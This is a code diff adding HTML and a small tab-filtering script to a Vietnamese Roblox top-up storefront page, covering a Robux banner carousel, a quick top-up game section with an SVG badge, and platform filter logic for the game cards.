+  </div>
+
+  <div class="chakra-container css-7zhyyi">
+   <div class="css-13te7cd">
+    <div class="css-1qxcpz5">
+     <div class="embla-homepage-banner css-0">
+      <div class="embla css-0">
+       <div class="embla__viewport css-0">
+        <div class="embla__container css-0" style="transform:translate3d(0,0,0)">
+                             <div class="embla__slide css-0">
+           <div class="css-18wbbzo">
+            
+            <img
+             alt="Halloween"
+             data-nimg="fill"
+             decoding="async"
+             fetchpriority="high"             sizes="(max-width: 768px) 100vw, 862px"
+             src="https://cdn.upanhlaylink.com/i/cIBo86Bp.png"
+             style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;object-fit:cover;color:transparent;border-radius:16px"
+            />
+
+                       </div>
+          </div>
+                             <div class="embla__slide css-0">
+           <div class="css-18wbbzo">
+            
+            <img
+             alt="Các gói robux Halloween"
+             data-nimg="fill"
+             decoding="async"
+             loading="lazy"             sizes="(max-width: 768px) 100vw, 862px"
+             src="https://cdn.upanhlaylink.com/i/mHUlPEvz.png"
+             style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;object-fit:cover;color:transparent;border-radius:16px"
+            />
+
+                       </div>
+          </div>
+                             <div class="embla__slide css-0">
+           <div class="css-18wbbzo">
+                         <a
+              href="/vn/game/roblox"
+              aria-label="Banner 2"
+              style="display:block;position:relative;width:100%;height:100%"
+             >
+            
+            <img
+             alt="Banner 2"
+             data-nimg="fill"
+             decoding="async"
+             loading="lazy"             sizes="(max-width: 768px) 100vw, 862px"
+             src="https://www.image2url.com/r2/default/images/1786026129969-e8cb6b80-98fd-4dc4-bab9-80570ec7bfac.png"
+             style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;object-fit:cover;color:transparent;border-radius:16px"
+            />
+
+                         </a>
+                       </div>
+          </div>
+                             <div class="embla__slide css-0">
+           <div class="css-18wbbzo">
+            
+            <img
+             alt="Các gói Robux"
+             data-nimg="fill"
+             decoding="async"
+             loading="lazy"             sizes="(max-width: 768px) 100vw, 862px"
+             src="https://cdn.upanhlaylink.com/i/70E7b1Px.jpg"
+             style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;object-fit:cover;color:transparent;border-radius:16px"
+            />
+
+                       </div>
+          </div>
+                 </div>
+       </div>
+
+       <button type="button" class="embla__button embla__button--prev" aria-label="Banner trước">
+        <svg fill="none" height="33" viewBox="0 0 32 33" width="32" xmlns="http://www.w3.org/2000/svg">
+         <path d="M20.0666 27.228L11.3733 18.5347C10.3466 17.508 10.3466 15.828 11.3733 14.8014L20.0667 6.10802" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" stroke-width="3"></path>
+        </svg>
+       </button>
+
+       <button type="button" class="embla__button embla__button--next" aria-label="Banner tiếp theo">
+        <svg fill="none" height="33" viewBox="0 0 32 33" width="32" xmlns="http://www.w3.org/2000/svg">
+         <path d="M11.9335 5.77209L20.6268 14.4654C21.6535 15.4921 21.6535 17.1721 20.6268 18.1988L11.9335 26.8921" stroke="white" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" stroke-width="3"></path>
+        </svg>
+       </button>
+
+       <div class="embla__dots css-0">
+                 <button
+          type="button"
+          class="embla__dot"
+          aria-label="Chuyển đến banner 1"
+         >
+          <div class="embla__dot-progress css-0"></div>
+         </button>
+                 <button
+          type="button"
+          class="embla__dot"
+          aria-label="Chuyển đến banner 2"
+         >
+          <div class="embla__dot-progress css-0"></div>
+         </button>
+                 <button
+          type="button"
+          class="embla__dot"
+          aria-label="Chuyển đến banner 3"
+         >
+          <div class="embla__dot-progress css-0"></div>
+         </button>
+                 <button
+          type="button"
+          class="embla__dot"
+          aria-label="Chuyển đến banner 4"
+         >
+          <div class="embla__dot-progress css-0"></div>
+         </button>
+               </div>
+      </div>
+     </div>
+    </div>
+
+    <!-- 3 banner dọc vẫn giữ nguyên như bản cũ -->
+    <div class="vertical-slider css-1j8atji">
+     <div class="css-1drjk0q">
+      <div class="vertical-slider__slide css-0">
+       <div class="css-1rk377d">
+        <img alt="Banner 101" data-nimg="fill" decoding="async" loading="lazy" sizes="(max-width: 768px) 100px, 270px" src="https://scdn-img.vnggames.com/mainsite/images/VNGGames-homepage-banner-1650x928.png?qlty=100&size=3840&iswebp=1" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;object-fit:cover;color:transparent;border-radius:16px"/>
+       </div>
+      </div>
+      <div class="vertical-slider__slide css-0">
+       <div class="css-1rk377d">
+        <img alt="Banner 102" data-nimg="fill" decoding="async" loading="lazy" sizes="(max-width: 768px) 100px, 270px" src="https://scdn-img.vnggames.com/mainsite/images/VNGGamesCS-homepage-banner-1650x928.png?qlty=100&size=3840&iswebp=1" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;object-fit:cover;color:transparent;border-radius:16px"/>
+       </div>
+      </div>
+      <div class="vertical-slider__slide css-0">
+       <div class="css-1rk377d">
+        <img alt="Banner 103" data-nimg="fill" decoding="async" loading="lazy" sizes="(max-width: 768px) 100px, 270px" src="https://scdn-img.vnggames.com/mainsite/images/homepage-subbanner-club-1650x928.png?qlty=100&size=3840&iswebp=1" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;object-fit:cover;color:transparent;border-radius:16px"/>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+ </div>
+</div>
+<div class="css-8atqhb">
+    <div class="chakra-container css-11vl7h3">
+        <div class="css-13hy8r2">
+            <h4 class="chakra-heading css-j6576b">
+                Game Hỗ Trợ Nạp Nhanh
+            </h4>
+
+           
+        </div>
+    </div>
+
+    <div class="chakra-container css-11vl7h3">
+        <div class="css-16l1zlf">
+           
+                        <a href="/vn/game/roblox" class="css-tj260x" data-platform="mobile">
+                <div class="css-l5kn1c">
+                    <img
+                        alt="Roblox VN"
+                        loading="lazy"
+                        decoding="async"
+                        data-nimg="fill"
+                        style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;object-fit:cover;color:transparent;border-radius:10px"
+                        sizes="(max-width: 768px) 150px, 168px"
+                        srcset="https://scdn-img.vnggames.com/mainsite/images/ROBLOX-appicon-64x64.png?qlty=75&size=16&iswebp=1 16w, https://scdn-img.vnggames.com/mainsite/images/ROBLOX-appicon-64x64.png?qlty=75&size=32&iswebp=1 32w, https://scdn-img.vnggames.com/mainsite/images/ROBLOX-appicon-64x64.png?qlty=75&size=48&iswebp=1 48w, https://scdn-img.vnggames.com/mainsite/images/ROBLOX-appicon-64x64.png?qlty=75&size=64&iswebp=1 64w, https://scdn-img.vnggames.com/mainsite/images/ROBLOX-appicon-64x64.png?qlty=75&size=96&iswebp=1 96w, https://scdn-img.vnggames.com/mainsite/images/ROBLOX-appicon-64x64.png?qlty=75&size=128&iswebp=1 128w, https://scdn-img.vnggames.com/mainsite/images/ROBLOX-appicon-64x64.png?qlty=75&size=256&iswebp=1 256w, https://scdn-img.vnggames.com/mainsite/images/ROBLOX-appicon-64x64.png?qlty=75&size=384&iswebp=1 384w, https://scdn-img.vnggames.com/mainsite/images/ROBLOX-appicon-64x64.png?qlty=75&size=640&iswebp=1 640w, https://scdn-img.vnggames.com/mainsite/images/ROBLOX-appicon-64x64.png?qlty=75&size=750&iswebp=1 750w, https://scdn-img.vnggames.com/mainsite/images/ROBLOX-appicon-64x64.png?qlty=75&size=828&iswebp=1 828w, https://scdn-img.vnggames.com/mainsite/images/ROBLOX-appicon-64x64.png?qlty=75&size=1080&iswebp=1 1080w, https://scdn-img.vnggames.com/mainsite/images/ROBLOX-appicon-64x64.png?qlty=75&size=1200&iswebp=1 1200w, https://scdn-img.vnggames.com/mainsite/images/ROBLOX-appicon-64x64.png?qlty=75&size=1920&iswebp=1 1920w, https://scdn-img.vnggames.com/mainsite/images/ROBLOX-appicon-64x64.png?qlty=75&size=2048&iswebp=1 2048w, https://scdn-img.vnggames.com/mainsite/images/ROBLOX-appicon-64x64.png?qlty=75&size=3840&iswebp=1 3840w"
+                        src="https://scdn-img.vnggames.com/mainsite/images/ROBLOX-appicon-64x64.png?qlty=75&size=3840&iswebp=1"
+                    >
+                              
+   <div class="css-nlmafb
+">
+  <svg fill="none" width="111" height="41" viewBox="0 0 111 41" xmlns="http://www.w3.org/2000/svg">
+    <g clip-path="url(#clip0_3080_2144)">
+      <path d="M0.643555 0H110.914V40.0039H4.64355C2.43441 40.0039 0.643555 38.213 0.643555 36.0039V0Z" fill="#FDEDE7"></path>
+      
+      <g filter="url(#filter0_d_3080_2144)">
+        <path d="M16.8864 18.3385C17.1139 17.2774 18.0217 16.5225 19.0703 16.5225H102.676C104.075 16.5225 105.131 17.8381 104.876 19.2638L102.908 30.2794C102.712 31.3786 101.787 32.1762 100.709 32.1762H16.7088C15.2776 32.1762 14.2144 30.8023 14.5249 29.354L16.8864 18.3385Z" fill="#FF4500"></path>
+      </g>
+      
+      <circle cx="17.7741" cy="21.0446" r="10.2619" fill="#F7B8A1" stroke="white" stroke-width="1.7393"></circle>
+      
+      <g filter="url(#filter1_d_3080_2144)">
+        <path d="M27.3408 18.4208L27.3009 18.051C27.2886 17.8482 27.138 17.5724 26.9575 17.6648C26.777 17.7572 26.8608 17.8917 26.815 17.9991C26.7927 18.5682 26.6536 19.1266 26.4063 19.6396C26.1591 20.1526 25.809 20.6093 25.3778 20.9813C24.9467 21.3533 24.4436 21.6327 23.8999 21.802C23.3562 21.9714 22.7835 22.0272 22.2173 21.9659C22.4889 21.6647 22.6884 21.3056 22.8008 20.9159C22.9131 20.5262 22.9353 20.116 22.8657 19.7165C22.8113 18.9172 22.5746 18.1813 22.6054 17.3478C22.633 16.7193 22.7857 16.1027 23.0548 15.534C23.3238 14.9654 23.7037 14.4562 24.1721 14.0363C25.1208 13.2039 26.2802 12.6486 27.5234 12.431C25.8964 11.8664 24.1927 11.5541 22.4712 11.5051C20.7494 11.4645 19.0577 11.9617 17.6316 12.9276C16.9195 13.4152 16.3305 14.0616 15.9111 14.8158C15.4916 15.5701 15.2532 16.4115 15.2147 17.2736L15.0968 17.1528L14.9755 16.9741C14.9002 16.8538 14.8174 16.7384 14.7276 16.6286C14.5531 16.4135 14.3678 16.2074 14.1725 16.0109C13.9766 15.8 13.7703 15.599 13.5543 15.4088L12.8441 14.8238C12.5814 14.7118 12.3594 14.5043 12.1188 14.3736C11.864 14.2439 11.6007 14.1316 11.3307 14.0376L10.5545 13.7068C10.3754 13.6304 10.2242 13.9188 10.2229 14.0875C10.2484 14.2745 10.3107 14.4545 10.4063 14.6172C10.7361 15.3967 10.803 16.2624 10.5969 17.0832C10.4434 17.9068 10.1603 18.7033 10.0068 19.5269C9.76336 21.1883 10.0372 22.8844 10.7912 24.3848C11.5453 25.8852 12.7429 27.1171 14.2214 27.9131C15.7289 28.6581 17.4156 28.9643 19.0888 28.7968C20.762 28.6293 22.3545 27.9948 23.6844 26.9657C24.9412 25.9447 25.9308 24.6334 26.5678 23.1448C27.2048 21.6561 27.4701 20.0349 27.3408 18.4208Z" fill="url(#paint0_linear_3080_2144)"></path>
+      </g>
+      
+      <g filter="url(#filter2_d_3080_2144)">
+        <path d="M24.4363 22.0229C24.1136 22.4339 23.7243 22.7878 23.2845 23.07C22.3514 23.7121 21.2263 24.0146 20.0971 23.9268C20.4483 23.5705 20.7047 23.132 20.8431 22.6512C20.9815 22.1704 20.9974 21.6627 20.8894 21.1742C20.6212 20.0157 19.6734 19.0613 19.6027 17.8036C19.5854 17.6103 19.5971 17.4155 19.6374 17.2257C19.7213 16.8212 19.9006 16.4426 20.1602 16.1214C20.4199 15.8001 20.7524 15.5454 21.1303 15.3785C19.8256 15.4667 18.5624 15.8729 17.4509 16.5618C17.3251 16.6393 17.204 16.7244 17.0884 16.8165C16.757 17.0408 16.4546 17.3053 16.1883 17.604C15.3855 18.68 14.9733 19.9974 15.0195 21.3391C14.9692 20.0796 14.4852 18.8763 13.6493 17.9328C13.1541 17.3286 12.5376 16.8351 11.8397 16.4842C12.1515 16.7507 12.378 17.1032 12.491 17.4976C12.6039 17.892 12.5982 18.3109 12.4747 18.7022C12.3847 19.029 12.2512 19.3423 12.0777 19.6336C12.0217 19.7649 11.9657 19.8963 11.9097 20.0276C11.8588 20.147 11.8079 20.2665 11.757 20.3859C11.2045 21.6862 11.1256 23.1391 11.5341 24.4915C11.9426 25.844 12.8125 27.0103 13.9924 27.7874L14.1954 27.8739C14.4241 28.0165 14.6631 28.1419 14.9103 28.2492C16.189 28.7936 17.6161 28.881 18.9517 28.4969C20.2872 28.1128 21.4498 27.2805 22.2439 26.1401C22.4788 25.8862 22.6937 25.6145 22.8866 25.3275C23.5778 24.3166 24.1011 23.2007 24.4363 22.0229Z" fill="url(#paint1_linear_3080_2144)"></path>
+      </g>
+      
+      <g filter="url(#filter3_d_3080_2144)">
+        <path d="M21.2718 24.0483C20.9095 24.4524 20.4625 24.7715 19.9626 24.9829C19.4627 25.1942 18.9223 25.2926 18.38 25.271C18.6135 24.9981 18.7764 24.6721 18.8545 24.3215C18.9326 23.971 18.9234 23.6067 18.8278 23.2605C18.6338 22.5569 18.0855 21.9563 18.0056 21.2168C17.978 20.8766 18.0549 20.5361 18.2261 20.2409C18.3974 19.9457 18.6547 19.7098 18.9637 19.5649C18.435 19.5367 17.906 19.6166 17.4092 19.7997C16.9124 19.9829 16.4581 20.2654 16.0742 20.63C15.6903 20.9947 15.3848 21.4338 15.1763 21.9205C14.9679 22.4073 14.8609 22.9314 14.8618 23.4609C14.7772 22.5163 14.3905 21.6242 13.7592 20.9166C13.5643 20.6352 13.2662 20.4422 12.9298 20.3796C12.8636 20.5348 13.0823 20.7832 13.1167 20.9672C13.1636 21.1927 13.1698 21.4248 13.1351 21.6524C12.991 22.1395 12.7912 22.6083 12.5396 23.0495C12.2767 23.7673 12.2145 24.5431 12.3595 25.2936C12.5045 26.0441 12.8513 26.7409 13.3626 27.3091C13.8885 27.8641 14.5586 28.2617 15.2978 28.4571C16.037 28.6526 16.8161 28.6382 17.5476 28.4156C18.4968 28.0972 19.3251 27.4946 19.9202 26.6895C20.5295 25.8998 20.9877 25.0044 21.2718 24.0483Z" fill="#F9F9F9"></path>
+      </g>
+      
+      <path d="M13.0389 14.3298C13.3647 13.8725 13.5556 13.3329 13.5898 12.7725C13.4514 12.1726 13.2202 11.598 12.9047 11.0694C12.6062 10.5219 12.4359 9.91379 12.4069 9.2909C12.4478 8.77054 12.6445 8.27456 12.9715 7.8677C13.2984 7.46084 13.7405 7.16199 14.2399 7.01014C13.996 7.21094 13.8032 7.46668 13.6772 7.75639C13.5513 8.0461 13.4958 8.36153 13.5153 8.67683C13.556 9.44205 14.038 10.099 14.2457 10.8367C14.4522 11.4709 14.4461 12.1552 14.2283 12.7857C14.0105 13.4161 13.5929 13.9583 13.0389 14.3298Z" fill="#FB5C01"></path>
+    </g>
+    
+    <path d="M31.8247 29.1309L33.4553 21.4345H30.4811L30.8855 19.4777H39.0776L38.6732 21.4345H35.7251L34.0814 29.1309H31.8247ZM38.4419 29.1309L40.4899 19.4777H44.2076C44.9729 19.4777 45.6034 19.6125 46.0991 19.8821C46.6035 20.1517 46.9775 20.4996 47.221 20.9257C47.4645 21.3518 47.5862 21.8041 47.5862 22.2824C47.5862 22.7085 47.4906 23.1303 47.2992 23.5477C47.1166 23.9564 46.8383 24.3217 46.4644 24.6435C46.0904 24.9652 45.6339 25.2 45.0947 25.3479L46.2948 29.1309H43.9859L42.8901 25.5175H41.4682L40.7116 29.1309H38.4419ZM44.1294 21.4214H42.3422L41.8596 23.7042H43.9076C44.3772 23.7042 44.7338 23.5738 44.9773 23.3129C45.2295 23.052 45.3556 22.7694 45.3556 22.465C45.3556 22.1954 45.2512 21.9562 45.0425 21.7475C44.8425 21.5301 44.5381 21.4214 44.1294 21.4214ZM47.7286 29.1309L49.7766 19.4777H56.5338L56.1164 21.4345H51.629L51.2246 23.2999H55.138L54.7336 25.1653H50.8332L50.4028 27.1741H54.9554L54.551 29.1309H47.7286ZM55.9707 29.1309L58.0188 19.4777H60.1059L62.6888 25.3348L63.9411 19.4777H66.1978L64.1498 29.1309H62.0496L59.4406 23.4955L58.2405 29.1309H55.9707ZM65.818 29.1309L67.866 19.4777H70.9055C71.6534 19.4777 72.3056 19.5951 72.8622 19.83C73.4187 20.0561 73.8797 20.3691 74.2449 20.7692C74.6102 21.1692 74.8841 21.6258 75.0667 22.1389C75.2494 22.6433 75.3407 23.1738 75.3407 23.7303C75.3407 24.3739 75.2189 25.0174 74.9754 25.661C74.7319 26.2958 74.3667 26.8785 73.8797 27.409C73.4013 27.9307 72.8056 28.3482 72.0925 28.6612C71.3794 28.9743 70.5532 29.1309 69.614 29.1309H65.818ZM70.7228 21.4605H69.7053L68.5052 27.122H69.7966C70.3358 27.122 70.8098 27.0263 71.2185 26.835C71.636 26.6437 71.9838 26.3915 72.2621 26.0784C72.5491 25.7566 72.7622 25.4044 72.9013 25.0218C73.0491 24.6304 73.1231 24.2434 73.1231 23.8608C73.1231 23.4433 73.0361 23.052 72.8622 22.6868C72.6882 22.3215 72.423 22.0258 72.0664 21.7997C71.7099 21.5736 71.262 21.4605 70.7228 21.4605ZM75.6143 29.1309L77.6623 19.4777H79.9321L77.8841 29.1309H75.6143ZM79.5507 29.1309L81.5987 19.4777H83.6858L86.2687 25.3348L87.521 19.4777H89.7777L87.7297 29.1309H85.6295L83.0206 23.4955L81.8204 29.1309H79.5507ZM94.368 29.2613C93.6462 29.2613 93.0157 29.1483 92.4765 28.9221C91.9373 28.6873 91.4851 28.3699 91.1198 27.9699C90.7633 27.5698 90.4937 27.1089 90.311 26.5871C90.1284 26.0653 90.0371 25.5131 90.0371 24.9304C90.0371 24.2782 90.1502 23.6216 90.3763 22.9607C90.6111 22.2998 90.9546 21.6997 91.4068 21.1605C91.8677 20.6126 92.4373 20.1735 93.1157 19.843C93.8027 19.5125 94.5941 19.3473 95.4898 19.3473C96.1507 19.3473 96.7073 19.4343 97.1595 19.6082C97.6118 19.7734 97.9814 19.9952 98.2683 20.2735C98.5553 20.5431 98.7771 20.83 98.9336 21.1344C99.0989 21.4301 99.2119 21.7171 99.2728 21.9954C99.3424 22.265 99.3815 22.4867 99.3902 22.6607C99.4076 22.8259 99.4163 22.9085 99.4163 22.9085H97.1856C97.1856 22.9085 97.1769 22.8563 97.1595 22.752C97.1508 22.6476 97.1161 22.5172 97.0552 22.3606C97.003 22.2041 96.9117 22.0519 96.7812 21.9041C96.6508 21.7475 96.4682 21.6171 96.2334 21.5127C95.9986 21.4084 95.6985 21.3562 95.3333 21.3562C94.8463 21.3562 94.4114 21.4562 94.0288 21.6562C93.6548 21.8562 93.3418 22.1258 93.0896 22.465C92.8374 22.7955 92.6461 23.1607 92.5156 23.5608C92.3852 23.9608 92.3199 24.3608 92.3199 24.7609C92.3199 25.2044 92.4026 25.6175 92.5678 26.0001C92.733 26.3741 92.9809 26.6741 93.3113 26.9002C93.6505 27.1263 94.0766 27.2394 94.5897 27.2394C95.1289 27.2394 95.5855 27.1046 95.9594 26.835C96.3421 26.5654 96.6204 26.1567 96.7943 25.6088H94.5375L94.9158 23.8608H99.3771L99.2858 24.5913C99.1467 25.6697 98.8423 26.5523 98.3727 27.2394C97.9118 27.9264 97.3335 28.4351 96.6377 28.7656C95.9507 29.0961 95.1941 29.2613 94.368 29.2613Z" fill="white"></path>
+    <path d="M34.8918 14.4365L36.271 7.94719H33.716L34.1117 6.07049H41.3472L40.9515 7.94719H38.4417L37.0624 14.4365H34.8918ZM45.0373 14.5496C44.3816 14.5496 43.8126 14.4478 43.3302 14.2443C42.8479 14.0333 42.4484 13.7507 42.1318 13.3964C41.8153 13.0346 41.5779 12.6277 41.4196 12.1754C41.2689 11.7157 41.1935 11.2371 41.1935 10.7396C41.1935 10.1668 41.2952 9.59779 41.4987 9.03252C41.7022 8.46725 42.0037 7.95473 42.4032 7.49498C42.8026 7.02768 43.2925 6.6546 43.8729 6.37574C44.4608 6.09687 45.1353 5.95743 45.8966 5.95743C46.5523 5.95743 47.1213 6.06295 47.6037 6.27399C48.086 6.47749 48.4855 6.76012 48.8021 7.1219C49.1186 7.47613 49.3523 7.88313 49.503 8.34289C49.6613 8.7951 49.7404 9.26993 49.7404 9.76737C49.7404 10.3402 49.6387 10.9092 49.4352 11.4745C49.2317 12.0398 48.9302 12.5561 48.5307 13.0233C48.1313 13.4831 47.6376 13.8524 47.0497 14.1313C46.4694 14.4101 45.7986 14.5496 45.0373 14.5496ZM45.1278 12.6163C45.5122 12.6163 45.8551 12.5334 46.1566 12.3676C46.4581 12.2018 46.7106 11.9832 46.914 11.7119C47.1175 11.433 47.2721 11.1278 47.3776 10.7962C47.4906 10.4645 47.5472 10.1367 47.5472 9.81259C47.5472 9.47343 47.4831 9.15688 47.355 8.86294C47.2344 8.56899 47.0459 8.33535 46.7897 8.162C46.541 7.98111 46.2169 7.89067 45.8174 7.89067C45.433 7.89067 45.0901 7.97357 44.7886 8.13939C44.4871 8.3052 44.2347 8.52754 44.0312 8.80641C43.8277 9.07774 43.6694 9.37922 43.5563 9.71085C43.4508 10.0349 43.3981 10.3628 43.3981 10.6944C43.3981 11.0336 43.4584 11.3501 43.5789 11.6441C43.7071 11.9305 43.8993 12.1641 44.1555 12.345C44.4118 12.5259 44.7359 12.6163 45.1278 12.6163ZM49.9009 14.4365L51.6759 6.07049H55.0788C55.7496 6.07049 56.3035 6.19485 56.7407 6.44357C57.1778 6.68475 57.5019 7.00131 57.713 7.39323C57.924 7.78515 58.0295 8.20345 58.0295 8.64813C58.0295 9.01744 57.9541 9.38676 57.8034 9.75607C57.6602 10.1178 57.4416 10.4495 57.1477 10.7509C56.8613 11.0524 56.507 11.2936 56.085 11.4745C55.6629 11.6478 55.1768 11.7345 54.6266 11.7345H52.6481L52.0715 14.4365H49.9009ZM54.8301 7.9585H53.4508L53.0438 9.85782H54.717C55.0788 9.85782 55.3577 9.74853 55.5536 9.52996C55.7496 9.31139 55.8476 9.07774 55.8476 8.82902C55.8476 8.60291 55.7647 8.40318 55.5988 8.22983C55.4406 8.04894 55.1843 7.9585 54.8301 7.9585Z" fill="#FF4500"></path>
+    
+    <defs>
+      <filter id="filter0_d_3080_2144" x="5.7742" y="11.3046" width="107.836" height="33.0463" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
+        <feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood>
+        <feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha"></feColorMatrix>
+        <feOffset dy="3.4786"></feOffset>
+        <feGaussianBlur stdDeviation="4.34825"></feGaussianBlur>
+        <feComposite in2="hardAlpha" operator="out"></feComposite>
+        <feColorMatrix type="matrix" values="0 0 0 0 0.825 0 0 0 0 0.61875 0 0 0 0 0.61875 0 0 0 0.76 0"></feColorMatrix>
+        <feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow_3080_2144"></feBlend>
+        <feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow_3080_2144" result="shape"></feBlend>
+      </filter>
+      
+      <filter id="filter1_d_3080_2144" x="9.91992" y="7.00977" width="17.6035" height="22.812" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
+        <feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood>
+        <feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha"></feColorMatrix>
+        <feOffset dy="0.979963"></feOffset>
+        <feComposite in2="hardAlpha" operator="out"></feComposite>
+        <feColorMatrix type="matrix" values="0 0 0 0 0.529167 0 0 0 0 0.148989 0 0 0 0 0 0 0 0 1 0"></feColorMatrix>
+        <feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow_3080_2144"></feBlend>
+        <feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow_3080_2144" result="shape"></feBlend>
+      </filter>
+      
+      <filter id="filter2_d_3080_2144" x="11.2764" y="15.3789" width="14.0298" height="13.3535" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
+        <feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood>
+        <feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha"></feColorMatrix>
+        <feOffset dx="0.86965"></feOffset>
+        <feComposite in2="hardAlpha" operator="out"></feComposite>
+        <feColorMatrix type="matrix" values="0 0 0 0 0.691667 0 0 0 0 0.194691 0 0 0 0 0 0 0 0 1 0"></feColorMatrix>
+        <feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow_3080_2144"></feBlend>
+        <feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow_3080_2144" result="shape"></feBlend>
+      </filter>
+      
+      <filter id="filter3_d_3080_2144" x="9.67425" y="16.081" width="14.2062" height="14.2521" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
+        <feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood>
+        <feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0" result="hardAlpha"></feColorMatrix>
+        <feOffset dy="-0.86965"></feOffset>
+        <feGaussianBlur stdDeviation="1.30448"></feGaussianBlur>
+        <feComposite in2="hardAlpha" operator="out"></feComposite>
+        <feColorMatrix type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.1 0"></feColorMatrix>
+        <feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow_3080_2144"></feBlend>
+        <feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow_3080_2144" result="shape"></feBlend>
+      </filter>
+      
+      <linearGradient id="paint0_linear_3080_2144" x1="22.0153" y1="10.0831" x2="14.3798" y2="27.996" gradientUnits="userSpaceOnUse">
+        <stop stop-color="#FF5F24"></stop>
+        <stop offset="0.437455" stop-color="#FF4500"></stop>
+        <stop offset="1" stop-color="#FF4500"></stop>
+      </linearGradient>
+      
+      <linearGradient id="paint1_linear_3080_2144" x1="20.0371" y1="14.9125" x2="14.438" y2="28.0479" gradientUnits="userSpaceOnUse">
+        <stop stop-color="#FFD78F"></stop>
+        <stop offset="0.481936" stop-color="#FFB32B"></stop>
+        <stop offset="1" stop-color="#FFB32B"></stop>
+      </linearGradient>
+      
+      <clipPath id="clip0_3080_2144">
+        <path d="M0.643555 0H110.914V40.0039H4.64355C2.43441 40.0039 0.643555 38.213 0.643555 36.0039V0Z" fill="white"></path>
+      </clipPath>
+    </defs>
+  </svg>
+</div>
+  </div>
+              
+
+                <h2 class="chakra-heading css-1rx7fwr">
+                    Roblox VN
+                </h2>
+
+                <button
+                    type="button"
+                    class="chakra-button css-183g3u6"
+                >
+                    Nạp ngay
+                </button>
+            </a>
+                    </div>
+
+        <div class="css-10oqk7x">
+            <button
+                type="button"
+                class="chakra-button css-1u5u7ol"
+            >
+                Xem thêm
+            </button>
+        </div>
+    </div>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const tabButtons = Array.from(
+        document.querySelectorAll('.chakra-tabs__tab')
+    );
+
+    const gameCards = Array.from(
+        document.querySelectorAll('.css-16l1zlf .css-tj260x')
+    );
+
+    const filterIcon = document.querySelector('.game-tabs__icon');
+
+    if (!tabButtons.length) {
+        return;
+    }
+
+    function setActiveTab(activeButton) {
+        tabButtons.forEach(function (button) {
+            const isActive = button === activeButton;
+            const tabContent = button.querySelector('.game-tabs');
+            const tabText = button.querySelector('.chakra-text');
+
+            button.setAttribute(
+                'aria-selected',
+                isActive ? 'true' : 'false'
+            );
+
+            button.setAttribute(
+                'tabindex',
+                isActive ? '0' : '-1'
+            );
+
+            if (!tabContent || !tabText) {
+                return;
+            }
+
+            /*
+             * Xóa class trạng thái cũ.
+             */
+            tabContent.classList.remove(
+                'css-fdir0c',
+                'css-12flyso'
+            );
+
+            tabText.classList.remove(
+                'css-1626tl7',
+                'css-r9ukvi'
+            );
+
+            if (isActive) {
+                /*
+                 * Tab active có chỗ dành cho icon.
+                 */
+                tabContent.classList.add('css-fdir0c');
+                tabText.classList.add('css-1626tl7');
+
+                /*
+                 * Di chuyển chính ảnh filter sang tab active.
+                 */
+                if (filterIcon) {
+                    tabContent.insertBefore(
+                        filterIcon,
+                        tabText
+                    );
+                }
+            } else {
+                /*
+                 * Tab không active trở về nền xám.
+                 */
+                tabContent.classList.add('css-12flyso');
+                tabText.classList.add('css-r9ukvi');
+            }
+        });
+    }
+
+    function filterGames(type) {
+        gameCards.forEach(function (card) {
+            const platform = card.dataset.platform || 'all';
+
+            const shouldShow =
+                type === 'all' ||
+                platform === type ||
+                platform === 'all';
+
+            card.style.display = shouldShow ? 'flex' : 'none';
+        });
+    }
+
+    tabButtons.forEach(function (button, index) {
+        button.addEventListener('click', function () {
+            let type = 'all';
+
+            if (index === 1) {
+                type = 'mobile';
+            }
+
+            if (index === 2) {
+                type = 'pc';
+            }
+
+            setActiveTab(button);
+            filterGames(type);
+        });
+    });
+
+    /*
+     * Mặc định TẤT CẢ active.
+     */
+    setActiveTab(tabButtons[0]);
+    filterGames('all');
+});
+</script>
+
+
+<div class="css-lfg2dn">
+    <div class="chakra-container css-7zhyyi">
+        <div class="css-1f6n2tc">
+            <div class="css-hndvli">
+                <div class="css-0">
+                    <div class="css-ry3hyw">
